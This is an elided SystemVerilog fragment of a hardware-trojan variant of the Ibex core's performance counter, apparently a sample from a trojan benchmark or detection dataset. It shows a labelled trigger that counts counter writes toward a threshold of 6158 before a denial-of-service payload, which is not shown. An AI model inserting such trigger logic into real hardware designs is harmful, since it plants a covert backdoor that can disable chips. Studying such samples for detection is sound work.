...
module ibex_counter_trojan_DoS #(
  ...
  output logic [63:0] counter_val_upd_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6158)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6158;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (counterh_we_i) trojan_counter <= trojan_counter + 1;
